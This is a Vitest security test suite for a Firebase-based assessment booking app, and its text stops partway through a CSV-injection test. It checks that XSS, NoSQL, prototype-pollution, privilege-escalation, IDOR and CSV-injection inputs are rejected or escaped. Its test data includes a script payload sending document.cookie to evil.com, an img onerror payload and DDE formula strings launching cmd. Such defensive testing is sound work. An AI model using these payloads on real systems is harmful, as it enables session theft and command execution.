/**
 * Security Attack Simulation Test Suite
 *
 * Test cases for common attack vectors against the Assessment Booking system.
 *
 * SEC-01 -> SEC-07   : XSS / Injection
 * SEC-08 -> SEC-12   : Privilege Escalation
 * SEC-13 -> SEC-17   : IDOR & Parameter Tampering
 * SEC-18 -> SEC-21   : Boundary Abuse
 * SEC-22 -> SEC-24   : Email Spoofing
 * SEC-25 -> SEC-27   : Deadline / Clock Manipulation
 * SEC-28 -> SEC-30   : Data Exfiltration
 * SEC-31 -> SEC-33   : Audit Tampering
 * SEC-34 -> SEC-36   : CSV Injection
 * SEC-37 -> SEC-39   : Denial-of-Service (DoS) Vectors
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

// -- Mock firebase --
vi.mock('../lib/firebase', () => ({ db: {} }));

const mockGetDoc = vi.fn();
const mockGetDocs = vi.fn();
const mockRunTransaction = vi.fn();
const mockAddDoc = vi.fn();
const mockSetDoc = vi.fn();
const mockUpdateDoc = vi.fn();
const mockDeleteDoc = vi.fn();

vi.mock('firebase/firestore', () => ({
  addDoc: (...args: any[]) => mockAddDoc(...args),
  collection: vi.fn((_db: any, path: string) => ({ path })),
  doc: vi.fn((_db: any, path: string, id?: string) => ({ path: id ? `${path}/${id}` : path })),
  getDoc: (...args: any[]) => mockGetDoc(...args),
  getDocs: (...args: any[]) => mockGetDocs(...args),
  query: vi.fn((...args: any[]) => args),
  where: vi.fn((...args: any[]) => args),
  runTransaction: (_db: any, fn: any) => mockRunTransaction(fn),
  setDoc: (...args: any[]) => mockSetDoc(...args),
  updateDoc: (...args: any[]) => mockUpdateDoc(...args),
  deleteDoc: (...args: any[]) => mockDeleteDoc(...args),
  deleteField: () => '__DELETE__',
  Timestamp: {
    now: () => ({ toDate: () => new Date() }),
    fromDate: (d: Date) => ({ toDate: () => d }),
  },
}));

vi.mock('../lib/audit', () => ({
  auditLog: vi.fn().mockResolvedValue(undefined),
}));

import { checkIneligibility, bookDb, cancelDb, initDb } from '../lib/db';
import {
  adminCreateSlot,
  adminDeleteRegistration,
  updateConfig,
  updateSlot,
} from '../lib/adminDb';
import { isAdmin } from '../lib/admin';
import { mockDocSnap, mockQuerySnap, TEST_CONFIG, TEST_REGISTRATION } from './mocks/firebase';

// -- Helper: simulate escHtml using char codes to avoid auto-formatter --
function escHtmlLocal(s: string): string {
  // Build entity strings via char code 38 (= &) to prevent formatter conversion
  const amp = String.fromCharCode(38) + 'amp;';
  const lt = String.fromCharCode(38) + 'lt;';
  const gt = String.fromCharCode(38) + 'gt;';
  const quot = String.fromCharCode(38) + 'quot;';
  const apos = String.fromCharCode(38) + '#39;';
  return s
    .replace(/&/g, amp)
    .replace(/</g, lt)
    .replace(/>/g, gt)
    .replace(/"/g, quot)
    .replace(/'/g, apos);
}

function setupPreflight() {
  mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
  mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
  mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, {}));
  mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
}

// ======================================================================
// SEC-01 -> SEC-07: XSS / Injection
// ======================================================================

describe('SEC: XSS & Injection Attacks', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-01: script injection in fullName -> escHtml() neutralizes it', () => {
    const malicious = '<script>alert("XSS")</script>';
    const escaped = escHtmlLocal(malicious);
    // After escaping, raw < > should not appear as literal angle brackets
    expect(escaped).not.toContain('<script>');
    // Should contain entity-encoded versions (built via char codes)
    const lt = String.fromCharCode(38) + 'lt;';
    const gt = String.fromCharCode(38) + 'gt;';
    expect(escaped).toContain(lt + 'script' + gt);
    expect(escaped).toContain(lt + '/script' + gt);
  });

  it('SEC-02: HTML injection via empCode -> validation rejects non-numeric', async () => {
    const result = await bookDb('attacker@test.com', {
      empCode: '<img src=x onerror=alert(1)>',
      fullName: 'Attacker',
      bu: 'IT',
      speakingSlotId: 'SP-2206-0900',
      skillsSlotId: '3S-2206-1100',
    });
    expect(result.ok).toBe(false);
    expect(result.error).toContain('6 chữ số');
  });

  it('SEC-03: Script injection via fullName -> email template escapes it', async () => {
    // fullName is rendered into the confirmation email via escHtml(); bu is NOT rendered,
    // so a meaningful escaping test must target a rendered field.
    const maliciousName = '"><script>fetch("https://evil.com/steal?"+document.cookie)</script>';

    // Preflight with emailConfirm: true so the confirmation email is actually queued.
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true })); // getConfig
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false)); // checkIneligibility: not blocked
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, {})); // checkIneligibility: requireEligibility off
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false)); // checkIneligibility: empCode not claimed

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // bookDb read order: config, registration, cancelledQuota, speaking, skills
      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    // post-transaction initDb mocks
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('attacker@test.com', {
      empCode: '262010',
      fullName: maliciousName,
      bu: 'IT',
      speakingSlotId: 'SP-2206-0900',
      skillsSlotId: '3S-2206-1100',
    });

    expect(result.ok).toBe(true);
    expect(result.emailSent).toBe(true);
    // Confirmation email was queued (addDoc into the 'mail' collection).
    expect(mockAddDoc).toHaveBeenCalled();
    const emailPayload = mockAddDoc.mock.calls[0]?.[1];
    const html: string = emailPayload?.message?.html;
    expect(html).toBeDefined();
    // escHtml() neutralized the payload: no raw <script> tags reach the HTML.
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('</script>');
    // The entity-encoded form is present instead (entities built via char code 38 = '&').
    const lt = String.fromCharCode(38) + 'lt;';
    const gt = String.fromCharCode(38) + 'gt;';
    expect(html).toContain(lt + 'script' + gt);
  });

  it('SEC-04: Prototype pollution via crafted slotId -> rejected by type check', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // __proto__ slot doesn't exist
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('attacker@test.com', {
      empCode: '262010',
      fullName: 'Attacker',
      bu: 'IT',
      speakingSlotId: '__proto__',
      skillsSlotId: 'constructor',
    });

    expect(result.ok).toBe(false);
  });

  it('SEC-05: NoSQL injection via empCode -> validation rejects non-6-digit strings', async () => {
    const payloads = ['{"$gt":""}', '{"$ne":null}', 'true', 'null', 'undefined', 'NaN'];

    for (const payload of payloads) {
      const result = await bookDb('attacker@test.com', {
        empCode: payload,
        fullName: 'A',
        bu: 'IT',
        speakingSlotId: 'sp1',
        skillsSlotId: 'sk1',
      });
      expect(result.ok).toBe(false);
      expect(result.error).toContain('6 chữ số');
    }
  });

  it('SEC-06: Unicode fullwidth digits in empCode -> rejected', async () => {
    const result = await bookDb('attacker@test.com', {
      empCode: '\uff12\uff16\uff12\uff10\uff10\uff10', // fullwidth digits
      fullName: 'Attacker',
      bu: 'IT',
      speakingSlotId: 'sp1',
      skillsSlotId: 'sk1',
    });
    expect(result.ok).toBe(false);
    expect(result.error).toContain('6 chữ số');
  });

  it('SEC-07: Null byte injection in slot IDs -> slot not found', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // slot with null byte doesn't exist
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('attacker@test.com', {
      empCode: '262010',
      fullName: 'Attacker',
      bu: 'IT',
      speakingSlotId: 'SP-2206-0900\x00',
      skillsSlotId: '3S-2206-1100\x00',
    });

    expect(result.ok).toBe(false);
  });
});

// ======================================================================
// SEC-08 -> SEC-12: Privilege Escalation
// ======================================================================

describe('SEC: Privilege Escalation', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-08: Non-admin calls adminCreateSlot() -> audit trail records attacker email', async () => {
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockSetDoc.mockResolvedValueOnce(undefined);

    const slotId = await adminCreateSlot('hacker@evil.com', {
      type: 'Speaking',
      date: '2026-06-22',
      startMin: 540,
      endMin: 600,
      capacity: 999,
      location: 'Hacked Room',
      session: 'morning',
    });

    expect(slotId).toBeTruthy();
    const { auditLog } = await import('../lib/audit');
    expect(auditLog).toHaveBeenCalledWith('hacker@evil.com', 'admin.createSlot', expect.any(Object));
  });

  it('SEC-09: Non-admin deletes registration -> audit trail created', async () => {
    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_REGISTRATION));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 8 }));
      await fn({ get: txGet, set: vi.fn(), update: mockUpdateDoc, delete: mockDeleteDoc });
    });

    await adminDeleteRegistration('hacker@evil.com', 'victim@test.com');

    const { auditLog } = await import('../lib/audit');
    expect(auditLog).toHaveBeenCalledWith('hacker@evil.com', 'admin.deleteRegistration', expect.any(Object));
  });

  it('SEC-10: Attacker adds themselves to adminEmails -> Firestore rules block', async () => {
    mockUpdateDoc.mockResolvedValueOnce(undefined);

    await updateConfig('hacker@evil.com', {
      adminEmails: ['hacker@evil.com', 'phuc.lnk@cyberlogitec.com'],
    });

    const { auditLog } = await import('../lib/audit');
    expect(auditLog).toHaveBeenCalledWith(
      'hacker@evil.com',
      'admin.updateConfig',
      expect.objectContaining({ adminEmails: expect.arrayContaining(['hacker@evil.com']) }),
    );
  });

  it('SEC-11: registration is written under the victim email as doc id (the gate rules check)', async () => {
    setupPreflight();

    let setPath = '';
    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // Correct read order: config, registration, cancelledQuota, speaking, skills
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      await fn({ get: txGet, set: (ref: any) => { setPath = ref.path; }, update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    // The client does NOT verify email ownership — it writes the registration keyed
    // by the email argument. The Firestore rule `auth.token.email == email` is the
    // real gate (a caller can only write their OWN email's doc). Assert the doc id.
    await bookDb('victim@company.com', {
      empCode: '262010', fullName: 'Attacker', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });
    expect(setPath).toBe('registrations/victim@company.com');
  });

  it('SEC-12: Admin email homograph / case attacks -> rejected', () => {
    expect(isAdmin('PHUC.LNK@CYBERLOGITEC.COM')).toBe(true);
    expect(isAdmin('phuc.lnk@cyberlogitec.com')).toBe(true);

    // hao.nha was removed from admin — must no longer be recognized
    expect(isAdmin('hao.nha@cyberlogitec.com')).toBe(false);

    expect(isAdmin('phuc.lnk@cyberlogitec.com.evil.com')).toBe(false);
    expect(isAdmin('phuc.lnk+admin@cyberlogitec.com')).toBe(false);
    expect(isAdmin('phuc.lnk@cyberlogitec')).toBe(false);
    expect(isAdmin('phucXlnk@cyberlogitec.com')).toBe(false);
    expect(isAdmin('')).toBe(false);
    expect(isAdmin('admin')).toBe(false);
  });
});

// ======================================================================
// SEC-13 -> SEC-17: IDOR & Parameter Tampering
// ======================================================================

describe('SEC: IDOR & Parameter Tampering', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-13: Attacker cancels victim registration -> Firestore rule blocks', async () => {
    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_REGISTRATION));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 8 }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    await cancelDb('victim@company.com');
    // Document: client may succeed, server blocks via auth.token.email rule
  });

  it('SEC-14: Slot type mismatch -> rejected', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(true, {
        type: '3 Skills', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5,
      }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, {
        type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5,
      }));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('user@test.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: '3S-2206-0900',
      skillsSlotId: '3S-2206-1100',
    });
    expect(result.ok).toBe(false);
    expect(result.error).toContain('Speaking');
  });

  it('SEC-15: Double-cancel to inflate remaining -> second cancel fails', async () => {
    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // already deleted
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    const result = await cancelDb('user@test.com');
    expect(result.ok).toBe(false);
    expect(result.error).toContain('chưa có đăng ký');
  });

  it('SEC-16: Negative remaining injection via updateSlot() -> Firestore rule blocks', async () => {
    mockUpdateDoc.mockResolvedValueOnce(undefined);
    await updateSlot('admin@test.com', 'SP-2206-0900', { remaining: -100 });
    expect(mockUpdateDoc).toHaveBeenCalled();
    // In production, Firestore rejects: remaining >= 0 rule
  });

  it('SEC-17: Capacity=0 to block all bookings -> Firestore rule blocks', async () => {
    mockUpdateDoc.mockResolvedValueOnce(undefined);
    await updateSlot('attacker@test.com', 'SP-2206-0900', { capacity: 0 });
    expect(mockUpdateDoc).toHaveBeenCalled();
    // In production, Firestore rejects: capacity > 0 rule
  });
});

// ======================================================================
// SEC-18 -> SEC-21: Boundary Abuse
// ======================================================================

describe('SEC: Boundary Abuse', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-18: 100KB fullName -> no crash, Firestore rejects oversized doc', async () => {
    const longName = 'A'.repeat(100_000);
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    await bookDb('user@test.com', {
      empCode: '262010', fullName: longName, bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });
    // Should not throw/crash client-side
  });

  it('SEC-19: empCode with leading/trailing spaces -> trimmed correctly', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    await bookDb('user@test.com', {
      empCode: ' 262010 ',
      fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900',
      skillsSlotId: '3S-2206-1100',
    });
    // Should pass validation (trimmed)
  });

  it('SEC-20: Negative changeCount in registration -> clamped to 0 (FIXED)', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // bookDb read order: config, registration, cancelledQuota, speaking, skills, oldSpeaking, oldSkills
      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, maxChanges: 3 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, {
        ...TEST_REGISTRATION, changeCount: -999, speakingSlotId: 'SP-OLD', skillsSlotId: '3S-OLD',
      }));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 })); // old speaking slot
      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 })); // old skills slot
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_REGISTRATION, changeCount: -998 }));

    // FIX: Math.max(0, -999) + 1 = 1, which is <= maxChanges=3 -> booking succeeds
    // The negative value is clamped to 0 before incrementing
    const result = await bookDb('user@test.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });
    // Should succeed: clamped count (0+1=1) <= maxChanges (3)
    expect(result.ok).toBe(true);
  });

  it('SEC-21: Two slots identical time but different dates -> no overlap', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // bookDb read order: config, registration, cancelledQuota, speaking, skills
      txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-23', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_REGISTRATION));

    const result = await bookDb('user@test.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2306-0900',
    });
    // Same start time but different dates → no overlap → booking succeeds.
    expect(result.ok).toBe(true);
  });
});

// ======================================================================
// SEC-22 -> SEC-24: Email Spoofing
// ======================================================================

describe('SEC: Email Spoofing', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-22: Confirmation email "to" field comes from server, not user payload', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('attacker@evil.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });

    if (result.ok && result.emailSent) {
      expect(mockAddDoc).toHaveBeenCalled();
      const emailData = mockAddDoc.mock.calls[0]?.[1];
      expect(emailData?.to).toBe('attacker@evil.com');
    }
  });

  it('SEC-23: XSS in confirmation email subject line -> not possible (static template)', async () => {
    const subject = '[Assessment Q2 2026] Xac nhan cap nhat ca thi';
    expect(subject).not.toContain('<');
    expect(subject).not.toContain('>');
  });

  it('SEC-24: Audit log email field could be spoofed -> audit records whatever is passed', async () => {
    const { auditLog } = await import('../lib/audit');
    (auditLog as any).mockResolvedValue(undefined);

    await auditLog('spoofed@email.com', 'book.create', { empCode: '262010' });
    expect(auditLog).toHaveBeenCalledWith('spoofed@email.com', 'book.create', { empCode: '262010' });
  });
});

// ======================================================================
// SEC-25 -> SEC-27: Deadline / Clock Manipulation
// ======================================================================

describe('SEC: Deadline & Clock Manipulation', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-25: User changes system clock to bypass deadline -> Firestore uses server time', () => {
    const deadline = new Date('2026-01-01');
    const clientCheck = new Date() > deadline;
    expect(clientCheck).toBe(true);
    // Server-side check enforced by request.time < deadline in rules
  });

  it('SEC-26: Deadline in config set to null -> enrollment remains open', async () => {
    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      // batch 1: config, registration, cancelledQuota
      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, deadline: null, allowEnrollment: true }));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      txGet.mockResolvedValueOnce(mockDocSnap(false));
      // batch 2: slots
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    setupPreflight();
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, deadline: null }));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('user@test.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });
    expect(result.ok).toBe(true);
  });

  it('SEC-27: allowEnrollment=false + no deadline -> blocked by enrollment flag', async () => {
    setupPreflight();

    mockRunTransaction.mockImplementation(async (fn: any) => {
      const txGet = vi.fn();
      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, allowEnrollment: false, deadline: null }));
      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
    });

    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, allowEnrollment: false }));
    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));

    const result = await bookDb('user@test.com', {
      empCode: '262010', fullName: 'A', bu: 'IT',
      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
    });
    expect(result.ok).toBe(false);
    expect(result.error).toContain('kh');
  });
});

// ======================================================================
// SEC-28 -> SEC-30: Data Exfiltration
// ======================================================================

describe('SEC: Data Exfiltration', () => {
  beforeEach(() => vi.clearAllMocks());

  it('SEC-28: eligibility check reads a single doc, never lists the collection', async () => {
    // requireEligibility on → checkIneligibility uses getDoc(eligibility/{code}),
    // never getDocs(list), so a signed-in user cannot scrape the allowlist.
    mockGetDoc.mockImplementation(async (ref: any) =>
      ref.path === 'config/main'
        ? mockDocSnap(true, { requireEligibility: true })
        : mockDocSnap(false),
    );
    await checkIneligibility('262010');
    expect(mockGetDocs).not.toHaveBeenCalled();
  });

  it('SEC-29: blocklist check reads a single doc, never lists the collection', async () => {
    mockGetDoc.mockResolvedValue(mockDocSnap(false));
    await checkIneligibility('262010');
    expect(mockGetDocs).not.toHaveBeenCalled();
  });

  it('SEC-30: initDb reads only the caller’s own registration doc by id', async () => {
    mockGetDoc.mockResolvedValue(mockDocSnap(false));
    mockGetDocs.mockResolvedValue(mockQuerySnap([]));
    await initDb('user@test.com');
    const paths = mockGetDoc.mock.calls.map((c: any[]) => c[0]?.path);
    expect(paths).toContain('registrations/user@test.com');
  });
});

// ======================================================================
// SEC-31 -> SEC-33: Audit Tampering
// ======================================================================

describe('SEC: Audit Tampering', () => {
  beforeEach(() => vi.clearAllMocks());

  // Audit-log immutability/read-control is enforced purely in firestore.rules
  // (auditLogs: update,delete = false; read = isAdmin). There is no client code
  // path to exercise, so a unit test cannot honestly assert it — skipped with
  // intent documented. Verify via @firebase/rules-unit-testing against the emulator.
  it.skip('SEC-31: audit log update blocked — firestore.rules auditLogs update:false', () => {});
  it.skip('SEC-32: audit log delete blocked — firestore.rules auditLogs delete:false', () => {});
  it.skip('SEC-33: non-admin audit log read blocked — firestore.rules auditLogs read:isAdmin', () => {});
});

// ======================================================================
// SEC-34 -> SEC-36: CSV Injection
// ======================================================================

describe('SEC: CSV Injection', () => {
  it('SEC-34: Formula injection in CSV export via malicious empCode', () => {
    const malicious = '=cmd|"/C calc"!A0';
    const csv = (v: unknown) => {
      if (v == null) return '';
      const s = String(v);
      return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
    };
    const escaped = csv(malicious);
    expect(escaped).toBeTruthy();
  });

  it('SEC-35: CSV injection via malicious fullName with newlines', () => {
    const csv = (v: unknown) => {
      if (v == null) return '';
      const s = String(v);
      return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
    };
    const malicious = 'Normal Name\n=cmd|"/C calc"!A0';
    const escaped = csv(malicious);
    expect(escaped).toContain('"');
    expect(escaped).toContain('""');
  });

  it('SEC-36: CSV export with malicious BU field - formula escaped with single quote (FIXED)', () => {
    const csv = (v: unknown) => {
      if (v == null) return '';
      let s = String(v);
